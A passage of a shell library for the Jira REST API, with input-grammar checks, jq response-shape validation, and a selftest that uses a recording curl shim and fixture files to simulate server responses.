  _base=$1; _flavour=$2; _project=$3; _type=$4
  _tj_project_ok "$_project" || { echo "refused: project failed the project grammar" >&2; return 1; }
  _tj_type_ok "$_type" || { echo "refused: the issue type failed the type grammar" >&2; return 1; }
  _tj_require_jq || return $?
  _tj_rundir_run _tj_cm_body "$_base" "$_flavour" "$_project" "$_type" _tj_rf_fields
}

# _tj_trf_project <body>: `<to.name>\t<fieldId>\t<kind>\t<name>` per REQUIRED screen field (a boolean `.required`
# true, no `hasDefaultValue: true`) of each transition; a non-boolean `.required` is a shape fault; a fieldId outside
# the grammar is dropped; to.name and name print only after `sok`, else `?`.
_tj_trf_project() {
  _trf_err=$(_tj_mktemp cmerr) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$1" | jq -r "$(_tj_cm_defs)$(_tj_rf_defs)"'
    (.transitions // []) as $t
    | if ($t | type) != "array" then error("KIT-SHAPE") else . end
    | $t[] | if type != "object" then error("KIT-SHAPE") else . end
    | (.to.name | nm) as $to
    | (.fields // {} | if type == "object" then . else error("KIT-SHAPE") end) | to_entries[]
    | .key as $id | .value | if type != "object" then error("KIT-SHAPE") else . end
    | if (.required | type) != "boolean" then error("KIT-SHAPE") else . end
    | select(.required == true and .hasDefaultValue != true and ($id | fid_ok))
    | [$to, $id, kind, (.name | nm)] | join("\t")' 2>"$_trf_err" \
    || { _tj_cm_fail "$_trf_err"; rm -f "$_trf_err"; return 2; }
  rm -f "$_trf_err"
}

_tj_trf_body() {
  _trfb=$(_tj_trs_fetch "$1" "$2" "$3") || return $?
  _tj_trf_project "$_trfb"
}

# tj_transition_fields <base> <flavour> <issue-key>: the required screen fields of each transition available to the
# card, one `<to.name>\t<fieldId>\t<kind>\t<name>` line each. GET-only; a workflow validator is not visible here.
tj_transition_fields() {
  [ $# -eq 3 ] || { echo "refused: transition-fields requires <base> <flavour> <issue-key>" >&2; return 1; }
  _tj_project_ok "${3%-*}" && _tj_id_ok "${3%-*}" "$3" || { echo "refused: issue key failed the key grammar" >&2; return 1; }
  _tj_require_jq || return $?
  _tj_rundir_run _tj_trf_body "$1" "$2" "$3"
}

# _tj_gf_field_ok <id>: the closed set get-fields can render — issuetype, parent, labels, priority (name), components and
# fixVersions (names, sorted, `|`-joined), duedate, customfield_N (option .value, option array, string, number, user
# accountId/name, team id; a text/ADF field renders only the word `present`, never its content).
_tj_gf_field_ok() {
  case "$1" in
    issuetype|parent|labels|priority|components|fixVersions|duedate) return 0 ;;
    customfield_[0-9]*)
      case "${1#customfield_}" in
        *[!0-9]*) return 1 ;;
      esac
      [ "${#1}" -le 22 ] ;;
    *) return 1 ;;
  esac
}

# tj_get_fields <base> <flavour> <project> <id> <fieldId>...: the post-read. Prints `<fieldId>\t<rendered>`
# in the order asked: an option -> .value, a string as-is, labels sorted + space-joined, parent -> .key,
# issuetype -> .name. The same S-4 id<->project match as get-issue, before and after the request.
tj_get_fields() {
  [ $# -ge 5 ] || { echo "refused: get-fields requires <base> <flavour> <project> <id> <fieldId>..." >&2; return 1; }
  _base=$1; _flavour=$2; _project=$3; _id=$4; shift 4
  _tj_id_ok "$_project" "$_id" || { echo "refused: id does not match project (grammar)" >&2; return 1; }
  _gf_ids=""
  for _gf_one in "$@"; do
    _tj_gf_field_ok "$_gf_one" || { echo "refused: get-fields field id failed the field grammar" >&2; return 1; }
    _gf_ids="$_gf_ids,$_gf_one"
  done
  _tj_require_jq || return $?
  _tj_rundir_run _tj_gf_body "$_base" "$_flavour" "$_project" "$_id" "${_gf_ids#,}"
}

_tj_gf_body() {
  _base=$1; _flavour=$2; _project=$3; _id=$4; _gf_ids=$5
  _gf_resp=$(jira_curl_authed GET "$_base$(_tj_rest_base "$_flavour")/issue/$_id?fields=project,$_gf_ids") || return $?
  _gf_key=$(printf '%s' "$_gf_resp" | jq -r '.key // empty' 2>/dev/null || true)
  _gf_proj=$(printf '%s' "$_gf_resp" | jq -r '.fields.project.key // empty' 2>/dev/null || true)
  if [ "$_gf_key" != "$_id" ] || [ "$_gf_proj" != "$_project" ]; then
    echo "refused: jira response key/project did not match the request" >&2
    return 1
  fi
  _gf_out=$(printf '%s' "$_gf_resp" | jq -r --arg ids "$_gf_ids" '
    def named: if type == "object" and (.name | type) == "string" then .name else error("KIT-SHAPE") end;
    def scalar:
      if type == "string" then (if test("[\r\n]") then "present" else . end)
      elif type == "number" then tostring
      elif type == "object" and .type == "doc" then "present"
      elif type == "object" then (.value // .accountId // .id // .name | if type == "string" then . elif type == "number" then tostring else error("KIT-SHAPE") end)
      else error("KIT-SHAPE") end;
    def render($id; $v):
      if $id == "issuetype" then ($v | if type == "object" then .name else error("KIT-SHAPE") end)
      elif $id == "parent" then ($v | if . == null then "" elif type == "object" then .key else error("KIT-SHAPE") end)
      elif $id == "labels" then ($v | if type == "array" and all(type == "string") then sort | join(" ") else error("KIT-SHAPE") end)
      elif $id == "priority" then ($v | if . == null then "" else named end)
      elif $id == "components" or $id == "fixVersions" then ($v | if type == "array" then map(named) | sort | join("|") else error("KIT-SHAPE") end)
      elif $id == "duedate" then ($v | if . == null then "" elif type == "string" then . else error("KIT-SHAPE") end)
      else ($v | if . == null then "" elif type == "array" then map(scalar) | sort | join("|") else scalar end) end;
    .fields as $f
    | ($ids | split(","))[] as $id
    | render($id; $f[$id]) as $r
    | if ($r | type) == "string" and ($r | explode | all(. >= 32 and . <= 126)) then [$id, $r] | join("\t") else error("KIT-CHARSET") end' 2>/dev/null) \
    || { echo "unverified: get-fields response failed the expected shape" >&2; return 2; }
  printf '%s\n' "$_gf_out"
}

# --- selftest --------------------------------------------------------------------------------
# Fixture bodies for the response-shape legs are RECORDED files under
# conformance/fixtures/tracker-jira/ (security-ruled: not inline) — reachable ONLY here, under
# --selftest (T9). Transport-level legs (redirect/429/5xx/no-jq) stay synthetic since they are not
# jira response SHAPES.
_TJ_FIXDIR() {
  CDPATH='' cd -- "$(dirname -- "$0")/.." && pwd
}

_tj_selftest() {
  sfail=0
  tmpd=$(mktemp -d) || { echo "FAIL: could not create temp dir"; exit 1; }
  _tj_px_pid=""
  # the selftest must not depend on the machine's egress: no ambient proxy or CA variable reaches any leg
  unset https_proxy HTTPS_PROXY no_proxy NO_PROXY SSL_CERT_FILE CURL_CA_BUNDLE SSL_CERT_DIR 2>/dev/null || true
  trap '[ -z "${_tj_px_pid:-}" ] || kill "$_tj_px_pid" 2>/dev/null; rm -rf "$tmpd"; [ "${sfail:-1}" -eq 0 ] || exit 1' EXIT INT TERM
  fixdir="$(_TJ_FIXDIR)/conformance/fixtures/tracker-jira"

  # --- a curl shim recording argv, proving the token is NEVER on argv (T5/J4). Response bodies
  # come from the recorded fixture files (H-4/security-ruled), selected by a sibling file. ---
  shim="$tmpd/curl"
  cat > "$shim" <<SHIMEOF
#!/bin/sh
_tj_shim_dir=\$(dirname "\$0")
# T2b2 0b: an optional artificial delay (a whole-seconds count in \$_tj_shim_dir/.sleep) so a
# selftest leg can send a real signal to a REAL in-flight "request" — absent for every other leg
# (a no-op stat + skip), never read from the environment.
if [ -f "\$_tj_shim_dir/.sleep" ]; then sleep "\$(cat "\$_tj_shim_dir/.sleep")"; fi
# F1 evidence: this process's OWN inherited environment, dumped verbatim, BEFORE anything else
# reads or reassigns a var — proves what env -i actually scrubbed (or didn't). A sentinel path
# is baked into this body (not read from env, for the same env -i reason as the F2/N-2 canary).
env > "$tmpd/.shimenv" 2>/dev/null || true
KIT_TJ_ARGV_LOG=\$(cat "\$_tj_shim_dir/.argvlog-path")
# T2b1: pagination needs a QUEUE, not a single fixture name — if a caller populated
# .fixture-seq (via the test harness's _tj_fxseq), pop its first line as THIS call's fixture
# and rewrite the file without it (deleting it once drained); every existing leg that never
# populates the queue keeps reading the single, unchanged .fixture file (brief T2b1 Writes).
_tj_seqfile="\$_tj_shim_dir/.fixture-seq"
if [ -s "\$_tj_seqfile" ]; then
  KIT_TJ_FIXTURE=\$(sed -n '1p' "\$_tj_seqfile")
  _tj_seqrest=\$(sed -n '2,\$p' "\$_tj_seqfile")
  if [ -n "\$_tj_seqrest" ]; then printf '%s\n' "\$_tj_seqrest" > "\$_tj_seqfile"; else rm -f "\$_tj_seqfile"; fi
else
  KIT_TJ_FIXTURE=\$(cat "\$_tj_shim_dir/.fixture" 2>/dev/null || true)
fi
printf '%s\n' "\$*" >> "\$KIT_TJ_ARGV_LOG"
cfg=\$(cat)
printf '%s\n' "\$cfg" | sed -n 's/^url = "\\(.*\\)"\$/\\1/p' > "\$_tj_shim_dir/.lasturl" 2>/dev/null || true
# TRACKER-REQUIRED-FIELDS-DISCOVERY: .urls — EVERY request's URL, one line each (.lasturl keeps only the last).
printf '%s\n' "\$cfg" | sed -n 's/^url = "\\(.*\\)"\$/\\1/p' >> "\$_tj_shim_dir/.urls" 2>/dev/null || true
# N-1 evidence: the RAW -K config as curl would see it, line-for-line (test-only artifact in a
# temp dir — never committed, never printed, this is the fixture shim reading its own stdin).
printf '%s\n' "\$cfg" > "\$_tj_shim_dir/.lastcfg" 2>/dev/null || true
# BOARD-CREATE-HONOURS-FIELD-MAP: .methods — every request's HTTP method, one line per request, so a
# leg can assert "refused BEFORE any POST" as a count of zero (never an absence of evidence).
printf '%s\n' "\$cfg" | sed -n 's/^request = "\\(.*\\)"\$/\\1/p' >> "\$_tj_shim_dir/.methods" 2>/dev/null || true
# T2b1: .lastbody — the POSTED request body, read from the referenced "data = \"@<file>\"" -K
# line BEFORE the caller deletes that temp file (the caller's own rm runs only after this shim
# process has already exited 0, so the referenced file is still on disk here).
_tj_bodypath=\$(printf '%s\n' "\$cfg" | sed -n 's/^data = "@\\(.*\\)"\$/\\1/p')
# T2b2 0b evidence: the request-body temp file PATH itself (not its content), so a leg can prove
# the file is GONE after the caller returns — independent of whether this shim process is still
# alive to have raced the caller's own cleanup.
printf '%s\n' "\$_tj_bodypath" > "\$_tj_shim_dir/.lastbodypath" 2>/dev/null || true
# T2b2 0b: deliver a REAL signal to this shim's own parent — the process that is curl's actual
# parent in the request pipeline — once the config has been read, so a leg can prove what happens
# when a signal arrives while a page fetch is genuinely in flight (never simulated). T2b2 fix1 I-1:
# a leg may instead want the signal delivered to a DIFFERENT, specific pid (the loop subshell
# itself, resolved test-side via \`ps\`, never trusted from in here) — \`.selfsignal-target-pid\`,
# when present and non-empty, names that pid; every EXISTING leg never creates this file, so it
# keeps signalling \$PPID exactly as before (no behaviour change to 0b's own leg). T2b2 fix2
# Q-m4/S-L3: the ACTUAL pid signalled is now recorded in \`.lastsignalled\` — the leg that cares
# which pid was really used reads this back and asserts it against its OWN independently-resolved
# target, rather than trusting that \`.selfsignal-target-pid\` was read in time (a late-written
# target file, read before it exists, would otherwise silently fall back to \$PPID with no trace).
if [ -f "\$_tj_shim_dir/.selfsignal" ]; then
  _tj_sigtarget="\$PPID"
  if [ -s "\$_tj_shim_dir/.selfsignal-target-pid" ]; then
    _tj_sigtarget=\$(cat "\$_tj_shim_dir/.selfsignal-target-pid")
  fi
  printf '%s\n' "\$_tj_sigtarget" > "\$_tj_shim_dir/.lastsignalled" 2>/dev/null || true
  kill -"\$(cat "\$_tj_shim_dir/.selfsignal")" "\$_tj_sigtarget" 2>/dev/null || true
  sleep 0.3
fi
if [ -n "\$_tj_bodypath" ] && [ -f "\$_tj_bodypath" ]; then
  cat "\$_tj_bodypath" > "\$_tj_shim_dir/.lastbody" 2>/dev/null || : > "\$_tj_shim_dir/.lastbody"
  # T3ac leg 9: also number this request's (possibly multi-line, pretty-printed) body into its own
  # file — .lastbody only keeps the LAST request, but the batching leg needs EVERY one.
  _tj_bn=1
  if [ -f "\$_tj_shim_dir/.bodyseq" ]; then _tj_bn=\$(( \$(cat "\$_tj_shim_dir/.bodyseq") + 1 )); fi
  printf '%s\n' "\$_tj_bn" > "\$_tj_shim_dir/.bodyseq"
  cat "\$_tj_bodypath" > "\$_tj_shim_dir/.body.\$_tj_bn" 2>/dev/null || true
else
  : > "\$_tj_shim_dir/.lastbody"
fi
out=""; hdr=""
prev=""
for a in "\$@"; do
  case "\$prev" in
    -o) out=\$a ;;
    -D) hdr=\$a ;;
  esac
  prev=\$a
done
# T2c0 item 4c: record the response/header temp paths too (the request-body path was already
# recorded above), so a leg can assert ALL THREE are gone after a signalled read.
printf '%s\n' "\$out" > "\$_tj_shim_dir/.lastresppath" 2>/dev/null || true
printf '%s\n' "\$hdr" > "\$_tj_shim_dir/.lastheaderpath" 2>/dev/null || true
FIXDIR="$fixdir"
write_ok()  { [ -n "\$hdr" ] && printf 'HTTP/1.1 200 OK\r\n\r\n' > "\$hdr"; }
write_body() { [ -n "\$out" ] && cat "\$1" > "\$out"; }
case "\$KIT_TJ_FIXTURE" in
  redirect)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 302 Found\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  redirect-body)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 302 Found\r\n\r\n' > "\$hdr"
    [ -n "\$out" ] && printf 'TJ-REDIRECT-BODY-MARKER' > "\$out" ;;
  status-esc)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 2\033[31m00 OK\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  status-short)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 20 OK\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  rate-limited)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 429 Too Many Requests\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  server-error)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 503 Service Unavailable\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  not-found)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 404 Not Found\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  unauthorized)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 401 Unauthorized\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  body-tmp)                     write_ok; write_body "\$_tj_shim_dir/.body-tmp" ;;
  body-tmp2)                    write_ok; write_body "\$_tj_shim_dir/.body-tmp2" ;;
  cloud-issue-good)             write_ok; write_body "\$FIXDIR/cloud-issue-good.json" ;;
  dc-issue-good)               write_ok; write_body "\$FIXDIR/dc-issue-good.json" ;;
  issue-after-transition)       write_ok; write_body "\$FIXDIR/issue-after-transition-good.json" ;;
  create-postread-good)         write_ok; write_body "\$FIXDIR/create-issue-postread-good.json" ;;
  transitions-empty)            write_ok; write_body "\$FIXDIR/transitions-empty.json" ;;
  cloud-issue-spoofed-project)  write_ok; write_body "\$FIXDIR/cloud-issue-spoofed-project.json" ;;
  cloud-issue-hostile-status-id) write_ok; write_body "\$FIXDIR/cloud-issue-hostile-status-id.json" ;;
  cloud-issue-hostile-key)      write_ok; write_body "\$FIXDIR/cloud-issue-hostile-key.json" ;;
  cloud-issue-no-status-id)     write_ok; write_body "\$FIXDIR/cloud-issue-no-status-id.json" ;;
  cloud-issue-assigned)         write_ok; write_body "\$FIXDIR/cloud-issue-assigned.json" ;;
  cloud-issue-unassigned)       write_ok; write_body "\$FIXDIR/cloud-issue-unassigned.json" ;;
  dc-issue-assigned)            write_ok; write_body "\$FIXDIR/dc-issue-assigned.json" ;;
  dc-issue-unassigned)          write_ok; write_body "\$FIXDIR/dc-issue-unassigned.json" ;;
  cloud-issue-assignee-bad-shape) write_ok; write_body "\$FIXDIR/cloud-issue-assignee-bad-shape.json" ;;
  cloud-issue-no-assignee-field) write_ok; write_body "\$FIXDIR/cloud-issue-no-assignee-field.json" ;;
  cloud-labels-page)             write_ok; write_body "\$FIXDIR/cloud-labels-page.json" ;;
  cloud-labels-extra-key)        write_ok; write_body "\$FIXDIR/cloud-labels-extra-key.json" ;;
  cloud-labels-trailing-newline) write_ok; write_body "\$FIXDIR/cloud-labels-trailing-newline.json" ;;
  cloud-labels-empty)            write_ok; write_body "\$FIXDIR/cloud-labels-empty.json" ;;
  cloud-labels-single)           write_ok; write_body "\$FIXDIR/cloud-labels-single.json" ;;
  cloud-labels-shape-object)     write_ok; write_body "\$FIXDIR/cloud-labels-shape-object.json" ;;
  cloud-labels-shape-string)     write_ok; write_body "\$FIXDIR/cloud-labels-shape-string.json" ;;
  cloud-labels-shape-absent)     write_ok; write_body "\$FIXDIR/cloud-labels-shape-absent.json" ;;
  cloud-labels-shape-nofields)   write_ok; write_body "\$FIXDIR/cloud-labels-shape-nofields.json" ;;
  lc-batch-100)                  write_ok; write_body "\$FIXDIR/cloud-lc-batch-100.json" ;;
  lc-batch-101)                  write_ok; write_body "\$FIXDIR/cloud-lc-batch-101.json" ;;
  field-empty-page)              write_ok; write_body "\$FIXDIR/cloud-field-empty-page.json" ;;
  field-empty-outside-set)       write_ok; write_body "\$FIXDIR/cloud-field-empty-outside-set.json" ;;
  field-empty-dup-second)        write_ok; write_body "\$FIXDIR/cloud-field-empty-dup-second.json" ;;
  field-empty-unsorted)          write_ok; write_body "\$FIXDIR/cloud-field-empty-unsorted.json" ;;
  mypermissions-cloud-over)     write_ok; write_body "\$FIXDIR/mypermissions-cloud-over-privileged.json" ;;
  mypermissions-cloud-browse)   write_ok; write_body "\$FIXDIR/mypermissions-cloud-browse-only.json" ;;
  mypermissions-dc-over)        write_ok; write_body "\$FIXDIR/mypermissions-dc-over-privileged.json" ;;
  mypermissions-error)          write_ok; write_body "\$FIXDIR/mypermissions-error-body.json" ;;
  assign-self-good)
    _lasturl=\$(cat "\$_tj_shim_dir/.lasturl" 2>/dev/null || true)
    case "\$_lasturl" in
      */myself) write_ok; write_body "\$FIXDIR/myself-good.json" ;;
      *) [ -n "\$hdr" ] && printf 'HTTP/1.1 204 No Content\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
    esac ;;
  assign-self-put-fail)
    _lasturl=\$(cat "\$_tj_shim_dir/.lasturl" 2>/dev/null || true)
    case "\$_lasturl" in
      */myself) write_ok; write_body "\$FIXDIR/myself-good.json" ;;
      *) [ -n "\$hdr" ] && printf 'HTTP/1.1 503 Service Unavailable\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
    esac ;;
  move-good|move-ambiguous|move-unknown)
    _lasturl=\$(cat "\$_tj_shim_dir/.lasturl" 2>/dev/null || true)
    case "\$_lasturl" in
      */transitions*)
        write_ok
        case "\$KIT_TJ_FIXTURE" in
          move-ambiguous) write_body "\$FIXDIR/transitions-ambiguous.json" ;;
          *)              write_body "\$FIXDIR/transitions-good.json" ;;
        esac ;;
      *) [ -n "\$hdr" ] && printf 'HTTP/1.1 204 No Content\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
    esac ;;
  move-post-fail)
    case "\$cfg" in
      *'request = "GET"'*)  write_ok; write_body "\$FIXDIR/transitions-good.json" ;;
      *) [ -n "\$hdr" ] && printf 'HTTP/1.1 503 Service Unavailable\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
    esac ;;
  move-fields-400|move-fields-400-tmp|move-fields-404|move-fields-ok)
    case "\$cfg" in
      *'request = "GET"'*)
        write_ok
        case "\$KIT_TJ_FIXTURE" in
          move-fields-400-tmp) write_body "\$_tj_shim_dir/.cm-body" ;;
          *)                   write_body "\$FIXDIR/transitions-with-fields.json" ;;
        esac ;;
      *)
        case "\$KIT_TJ_FIXTURE" in
          move-fields-ok) [ -n "\$hdr" ] && printf 'HTTP/1.1 204 No Content\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
          move-fields-404) [ -n "\$hdr" ] && printf 'HTTP/1.1 404 Not Found\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
          *) [ -n "\$hdr" ] && printf 'HTTP/1.1 400 Bad Request\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && printf 'TJ-400-BODY-MARKER' > "\$out" ;;
        esac ;;
    esac ;;
  bad-request)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 400 Bad Request\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && printf 'TJ-400-BODY-MARKER' > "\$out" ;;
  cm-req-task)                  write_ok; write_body "\$FIXDIR/cloud-createmeta-task-required.json" ;;
  cm-req-dc-task)               write_ok; write_body "\$FIXDIR/dc-createmeta-task-required.json" ;;
  create-good)                  write_ok; write_body "\$FIXDIR/create-issue-good.json" ;;
  create-bad)                   write_ok; write_body "\$FIXDIR/create-issue-bad.json" ;;
  create-badkey)
    write_ok; [ -n "\$out" ] && printf '{"key":"AB 1"}' > "\$out" ;;
  status-ids-cloud)              write_ok; write_body "\$FIXDIR/cloud-project-statuses.json" ;;
  status-ids-dc)                 write_ok; write_body "\$FIXDIR/dc-project-statuses.json" ;;
  status-ids-hostile-name)       write_ok; write_body "\$FIXDIR/cloud-statuses-hostile-name.json" ;;
  status-ids-error-object)       write_ok; write_body "\$FIXDIR/cloud-statuses-error-object.json" ;;
  status-ids-nonarray)           write_ok; write_body "\$FIXDIR/cloud-statuses-nonarray.json" ;;
  status-ids-bad-shape)          write_ok; write_body "\$FIXDIR/cloud-statuses-bad-shape.json" ;;
  status-ids-unformattable)      write_ok; write_body "\$FIXDIR/cloud-statuses-unformattable-name.json" ;;
  status-ids-same-id-two-names)  write_ok; write_body "\$FIXDIR/cloud-statuses-same-id-two-names.json" ;;
  status-ids-dupname)            write_ok; write_body "\$FIXDIR/cloud-statuses-dupname.json" ;;
  status-ids-nonnumeric-id)      write_ok; write_body "\$FIXDIR/cloud-statuses-nonnumeric-id.json" ;;
  status-ids-two-documents)      write_ok; write_body "\$FIXDIR/cloud-statuses-two-documents.json" ;;
  status-ids-nonstring-name)     write_ok; write_body "\$FIXDIR/cloud-statuses-nonstring-name.json" ;;
  status-ids-nonstring-id)       write_ok; write_body "\$FIXDIR/cloud-statuses-nonstring-id.json" ;;
  status-ids-nonobject-status)   write_ok; write_body "\$FIXDIR/cloud-statuses-nonobject-status.json" ;;
  status-ids-leading-zero)       write_ok; write_body "\$FIXDIR/cloud-statuses-leading-zero-id.json" ;;
  status-ids-leading-zero-rev)   write_ok; write_body "\$FIXDIR/cloud-statuses-leading-zero-id-reversed.json" ;;
  status-ids-name-61)            write_ok; write_body "\$FIXDIR/cloud-statuses-name-61-chars.json" ;;
  status-ids-empty-name)         write_ok; write_body "\$FIXDIR/cloud-statuses-empty-name.json" ;;
  status-ids-apostrophe)         write_ok; write_body "\$FIXDIR/cloud-statuses-apostrophe-name.json" ;;
  status-ids-locale-name)        write_ok; write_body "\$FIXDIR/cloud-statuses-locale-name.json" ;;
  status-ids-id-newline)         write_ok; write_body "\$FIXDIR/cloud-statuses-id-embedded-newline.json" ;;
  status-ids-name-newline)       write_ok; write_body "\$FIXDIR/cloud-statuses-name-embedded-newline.json" ;;
  status-ids-empty-catalogue)    write_ok; write_body "\$FIXDIR/cloud-statuses-empty-catalogue.json" ;;
  status-ids-all-empty)          write_ok; write_body "\$FIXDIR/cloud-statuses-all-empty.json" ;;
  list-page1)                    write_ok; write_body "\$FIXDIR/cloud-list-page1.json" ;;
  list-page2)                    write_ok; write_body "\$FIXDIR/cloud-list-page2.json" ;;
  list-dupkey)                   write_ok; write_body "\$FIXDIR/cloud-list-dupkey.json" ;;
  list-crossproject)             write_ok; write_body "\$FIXDIR/cloud-list-crossproject.json" ;;
  list-trailing-newline)         write_ok; write_body "\$FIXDIR/cloud-list-trailing-newline-key.json" ;;
  list-missing-issues)           write_ok; write_body "\$FIXDIR/cloud-list-missing-issues.json" ;;
  list-object-issues)            write_ok; write_body "\$FIXDIR/cloud-list-object-issues.json" ;;
  list-nullkey)                  write_ok; write_body "\$FIXDIR/cloud-list-nullkey.json" ;;
  list-nokey)                    write_ok; write_body "\$FIXDIR/cloud-list-nokey.json" ;;
  list-cap-exact)                write_ok; write_body "\$FIXDIR/cloud-list-cap-exact.json" ;;
  list-zero-issues)              write_ok; write_body "\$FIXDIR/cloud-list-zero-issues.json" ;;
  list-ready)                    write_ok; write_body "\$FIXDIR/cloud-list-ready.json" ;;
  list-inprogress)               write_ok; write_body "\$FIXDIR/cloud-list-inprogress.json" ;;
  list-unsorted-order)           write_ok; write_body "\$FIXDIR/cloud-list-unsorted-order.json" ;;
  list-over-max)                 write_ok; write_body "\$FIXDIR/cloud-list-over-max.json" ;;
  list-over-max-101)             write_ok; write_body "\$FIXDIR/cloud-list-over-max-101.json" ;;
  dc-list-page1)                 write_ok; write_body "\$FIXDIR/dc-list-page1.json" ;;
  dc-list-page2)                 write_ok; write_body "\$FIXDIR/dc-list-page2.json" ;;
  dc-list-no-total)              write_ok; write_body "\$FIXDIR/dc-list-no-total.json" ;;
  dc-list-total-string)          write_ok; write_body "\$FIXDIR/dc-list-total-string.json" ;;
  dc-list-total-string-coherent) write_ok; write_body "\$FIXDIR/dc-list-total-string-coherent.json" ;;
  dc-list-total-null)            write_ok; write_body "\$FIXDIR/dc-list-total-null.json" ;;
  dc-list-total-negative)        write_ok; write_body "\$FIXDIR/dc-list-total-negative.json" ;;
  dc-list-total-fraction)        write_ok; write_body "\$FIXDIR/dc-list-total-fraction.json" ;;
  dc-list-total-5dot0)           write_ok; write_body "\$FIXDIR/dc-list-total-5dot0.json" ;;
  dc-list-total-2dot0)           write_ok; write_body "\$FIXDIR/dc-list-total-2dot0.json" ;;
  dc-list-total-1e1)             write_ok; write_body "\$FIXDIR/dc-list-total-1e1.json" ;;
  dc-list-total-1E2)             write_ok; write_body "\$FIXDIR/dc-list-total-1E2.json" ;;
  dc-list-total-1e100)           write_ok; write_body "\$FIXDIR/dc-list-total-1e100.json" ;;
  dc-list-total-1e300)           write_ok; write_body "\$FIXDIR/dc-list-total-1e300.json" ;;
  dc-list-total-huge20)          write_ok; write_body "\$FIXDIR/dc-list-total-huge20.json" ;;
  dc-list-total-2p53)            write_ok; write_body "\$FIXDIR/dc-list-total-2p53.json" ;;
  dc-list-total-negzero)         write_ok; write_body "\$FIXDIR/dc-list-total-negzero.json" ;;
  dc-list-total-3dot0)           write_ok; write_body "\$FIXDIR/dc-list-total-3dot0.json" ;;
  dc-list-total1-issues3)        write_ok; write_body "\$FIXDIR/dc-list-total1-issues3.json" ;;
  dc-list-total0-issues)         write_ok; write_body "\$FIXDIR/dc-list-total0-issues.json" ;;
  dc-list-empty-page)            write_ok; write_body "\$FIXDIR/dc-list-empty-page.json" ;;
  dc-list-page1-total-drift)     write_ok; write_body "\$FIXDIR/dc-list-page1-total-drift.json" ;;
  dc-list-page2-total-drift)     write_ok; write_body "\$FIXDIR/dc-list-page2-total-drift.json" ;;
  dc-list-page1-lying-startat)   write_ok; write_body "\$FIXDIR/dc-list-page1-lying-startat.json" ;;
  dc-list-page2-lying-startat)   write_ok; write_body "\$FIXDIR/dc-list-page2-lying-startat.json" ;;
  dc-list-page1-bigtotal)        write_ok; write_body "\$FIXDIR/dc-list-page1-bigtotal.json" ;;
  dc-list-page2-bigtotal)        write_ok; write_body "\$FIXDIR/dc-list-page2-bigtotal.json" ;;
  dc-list-cap-exact)             write_ok; write_body "\$FIXDIR/dc-list-cap-exact.json" ;;
  dc-list-crossproject)          write_ok; write_body "\$FIXDIR/dc-list-crossproject.json" ;;
  list-leading-zero-key)         write_ok; write_body "\$FIXDIR/cloud-list-leading-zero-key.json" ;;
  list-page1-backslash-token)    write_ok; write_body "\$FIXDIR/cloud-list-page1-backslash-token.json" ;;
  list-page1-tilde-bang-token)   write_ok; write_body "\$FIXDIR/cloud-list-page1-tilde-bang-token.json" ;;
  list-page1-real-newline-token) write_ok; write_body "\$FIXDIR/cloud-list-page1-real-newline-token.json" ;;
  list-page1-trailing-newline-token) write_ok; write_body "\$FIXDIR/cloud-list-page1-trailing-newline-token.json" ;;
  list-islast-true-with-token)   write_ok; write_body "\$FIXDIR/cloud-list-islast-true-with-token.json" ;;
  list-islast-false-no-token)    write_ok; write_body "\$FIXDIR/cloud-list-islast-false-no-token.json" ;;
  list-missing-islast)           write_ok; write_body "\$FIXDIR/cloud-list-missing-islast.json" ;;
  list-continues)                write_ok; write_body "\$FIXDIR/cloud-list-continues.json" ;;
  list-islast-string-true)       write_ok; write_body "\$FIXDIR/cloud-list-islast-string-true.json" ;;
  list-islast-true-token-false)  write_ok; write_body "\$FIXDIR/cloud-list-islast-true-token-false.json" ;;
  list-islast-true-token-empty)  write_ok; write_body "\$FIXDIR/cloud-list-islast-true-token-empty.json" ;;
  list-islast-string-false-token) write_ok; write_body "\$FIXDIR/cloud-list-islast-string-false-token.json" ;;
  list-two-documents)            write_ok; write_body "\$FIXDIR/cloud-list-two-documents.json" ;;
  list-issues-numbers)           write_ok; write_body "\$FIXDIR/cloud-list-issues-numbers.json" ;;
  list-issues-strings)           write_ok; write_body "\$FIXDIR/cloud-list-issues-strings.json" ;;
  list-issues-nulls)             write_ok; write_body "\$FIXDIR/cloud-list-issues-nulls.json" ;;
  cm-types)                      write_ok; write_body "\$FIXDIR/cloud-createmeta-types.json" ;;
  cm-task)                       write_ok; write_body "\$FIXDIR/cloud-createmeta-task.json" ;;
  cm-story)                      write_ok; write_body "\$FIXDIR/cloud-createmeta-story.json" ;;
  cm-epic)                       write_ok; write_body "\$FIXDIR/cloud-createmeta-epic.json" ;;
  cm-dc-types)                   write_ok; write_body "\$FIXDIR/dc-createmeta-types.json" ;;
  cm-dc-task)                    write_ok; write_body "\$FIXDIR/dc-createmeta-task.json" ;;
  cm-tmp)                        write_ok; write_body "\$_tj_shim_dir/.cm-body" ;;
  gf-story)                      write_ok; write_body "\$FIXDIR/cloud-getfields-story.json" ;;
